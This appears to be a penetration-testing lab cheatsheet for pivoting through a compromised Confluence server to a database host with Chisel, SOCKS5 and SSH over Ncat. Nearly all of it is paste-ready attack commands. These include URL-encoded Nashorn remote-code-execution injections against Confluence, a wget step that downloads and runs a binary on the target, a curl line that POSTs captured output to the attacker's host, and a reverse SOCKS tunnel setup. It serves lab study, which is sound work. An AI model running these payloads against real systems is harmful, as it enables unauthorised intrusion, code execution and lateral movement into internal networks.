Chisel is used here to create a reverse SOCKS5 proxy over HTTP from CONFLUENCE01 back to Kali, then SSH uses that proxy (via Ncat) to reach PGDATABASE01. Below is a compact cheatsheet of the concrete commands from your scenario that you can paste into notes and annotate with your own diagrams/screenshots.[](https://github.com/twelvesec/port-forwarding)

​

> Replace IPs with your lab values:  
> `KALI_IP=192.168.118.4`  
> `CONFLUENCE01=192.168.50.63`  
> Confluence HTTP port: `8090`

---

## 1. Prepare chisel on Kali

bash

`# 1) Copy Kali’s chisel to Apache webroot (first attempt) sudo cp "$(which chisel)" /var/www/html/ # 2) Start Apache sudo systemctl start apache2`

If GLIBC error occurs on target, download the Go 1.19-built chisel 1.8.1:

bash

`# 3) Download amd64 Linux chisel 1.8.1 from GitHub wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz # 4) Unpack and overwrite webroot copy gunzip chisel_1.8.1_linux_amd64.gz mv chisel_1.8.1_linux_amd64 chisel sudo cp ./chisel /var/www/html/`

---

## 2. Download chisel on CONFLUENCE01 via injection

## 2.1 Raw wget payload (what you want executed on CONFLUENCE01)

bash

`wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel`

## 2.2 Same wget wrapped in Confluence Nashorn RCE (curl from Kali)

bash

`curl "http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/"`

Useful to confirm download via Apache log on Kali:

bash

`tail -f /var/log/apache2/access.log # Look for: "GET /chisel HTTP/1.1" ... "Wget/..."`

---

## 3. Start chisel server on Kali (reverse SOCKS)

bash

`# Reverse tunnelling, listening HTTP on 8080, SOCKS5 on 1080 (loopback) chisel server --port 8080 --reverse`

Optional: capture traffic to confirm HTTP-only tunnel:

bash

`sudo tcpdump -nvvvXi tun0 tcp port 8080`

---

## 4. Start chisel client on CONFLUENCE01 via injection

## 4.1 Simple client command (what must run on CONFLUENCE01)

bash

`/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &`

## 4.2 Debug variant: capture stderr/stdout and POST back to Kali

bash

`/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; \ curl --data @/tmp/output http://192.168.118.4:8080/`

## 4.3 Same (debug) as Confluence injection (curl from Kali)

bash

`curl "http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.118.4:8080/%27%29.start%28%29%22%29%7D/"`

## 4.4 Final working injection (no debug, just background)

bash

`curl "http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/"`

Chisel server output should show something like “session … R:127.0.0.1:1080=>socks: Listening”.[](https://github.com/jpillora/chisel)

​

Check SOCKS listener on Kali:

bash

`ss -ntplu | grep 1080 # tcp LISTEN 0 4096 127.0.0.1:1080 ...`

---

## 5. SSH through the SOCKS5 proxy with Ncat

## 5.1 Install Ncat on Kali

bash

`sudo apt install ncat`

## 5.2 One-liner SSH using ProxyCommand + Ncat + SOCKS5

bash

`ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' \     database_admin@10.4.50.215`

You can put the ProxyCommand into `~/.ssh/config`:

text

`Host pgdatabase01     HostName 10.4.50.215    User database_admin    ProxyCommand ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p`

Then just:

bash

`ssh pgdatabase01`

---

## 6. Mini “flow image” descriptions for your notes

You can quickly sketch these in Excalidraw or Obsidian:

- Image 1: “DPI-constrained network”  
    Boxes: `Kali` ↔ `FIREWALL/DPI (HTTP only)` ↔ `CONFLUENCE01` ↔ `PGDATABASE01`.  
    Label: “Only HTTP allowed between Kali and CONFLUENCE01; SSH blocked.”
    
- Image 2: “Chisel reverse HTTP tunnel”  
    Arrow from CONFLUENCE01 to Kali: `chisel client 192.168.118.4:8080 R:socks (HTTP/WebSocket)`  
    On Kali, draw `chisel server --port 8080 --reverse` exposing `127.0.0.1:1080 (SOCKS5)`.
    
- Image 3: “SSH over SOCKS over HTTP”  
    `ssh (ProxyCommand=ncat socks5 127.0.0.1:1080)` → `SOCKS5 on Kali (chisel)` → HTTP/WebSocket tunnel → `chisel client on CONFLUENCE01` → `SSH server on PGDATABASE01`.

## Alternative: pure local port forward

Instead, set up Chisel like SSH `-L`: expose a **local TCP port** on Kali that is directly forwarded to `PGDATABASE01:8008`.  
Then just run the exercise client _without_ proxychains, pointing it at `127.0.0.1:<localport>`.

General pattern (you’ll adapt to your lab’s direction of connection):

- Chisel server on one side (attack or pivot):  
    `chisel server -p 9001`
    
- Chisel client on the other side (where it can reach PGDATABASE01:8008):  
    `chisel client <server-ip>:9001 9008:PGDATABASE01:8008`

On your Kali box, port `9008` will now be a plain TCP port that talks to `PGDATABASE01:8008`.  
You can then run:

bash

`./chisel_exercise_client 127.0.0.1 9008`

(or whatever args the exercise expects) and it will hit `PGDATABASE01:8008` through the tunnel, no SOCKS, no proxychains.